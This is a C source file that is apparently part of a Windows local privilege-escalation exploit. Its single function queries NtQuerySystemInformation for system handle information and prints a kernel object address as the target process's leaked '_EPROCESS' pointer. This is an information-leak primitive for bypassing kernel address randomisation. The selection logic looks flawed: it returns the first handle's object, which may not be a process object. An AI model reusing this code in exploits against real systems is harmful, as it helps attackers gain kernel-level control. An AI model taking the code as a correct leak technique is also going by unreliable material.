#include "exploit.h"
#include "leak.h"

unsigned long long leak_eprocess_pointer(unsigned long process_id)
{
	char unused = 0;
	HMODULE h_ntdll = 0;
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	unsigned long handle_entries_length = 0;
	NTSTATUS status = 0;
	PSYSTEM_HANDLE_INFORMATION_EX handle_entries = 0;

	h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load the \"ntdll.dll\" API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Loaded the \"ntdll.dll\" API library. Handle Value: 0x%p", h_ntdll);

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate the \"NtQuerySystemInformation\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Located the \"NtQuerySystemInformation\" function. Function Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemExtendedHandleInformation, 0, 0, &handle_entries_length);
	handle_entries = (PSYSTEM_HANDLE_INFORMATION_EX)VirtualAlloc(0, handle_entries_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	status = _NtQuerySystemInformation(SystemExtendedHandleInformation, handle_entries, handle_entries_length, 0);
	while (status == 0xC0000004)
	{
		if (handle_entries)
		{
			VirtualFree(handle_entries, 0, MEM_RELEASE);
		}
		handle_entries_length *= 2;
		handle_entries = (PSYSTEM_HANDLE_INFORMATION_EX)VirtualAlloc(0, handle_entries_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (handle_entries)
		{
			status = _NtQuerySystemInformation(SystemExtendedHandleInformation, handle_entries, handle_entries_length, 0);
		}
	}
	printf("\n[+] Queried system information.");

	if (handle_entries)
	{
		for (int i = 0; i < handle_entries->NumberOfHandles; i++)
		{
			if (handle_entries->Handles[i].UniqueProcessId == process_id)
			{
				printf("\n[+] Leaked the target process' \"_EPROCESS\" structure pointer. Structure Pointer: 0x%p", handle_entries->Handles[i].Object);
				return handle_entries->Handles[i].Object;
			}
		}
	}

	printf("\n[-] Failed to leak the target process' \"_EPROCESS\" structure pointer.");
	unused = getchar();
	return 0;
}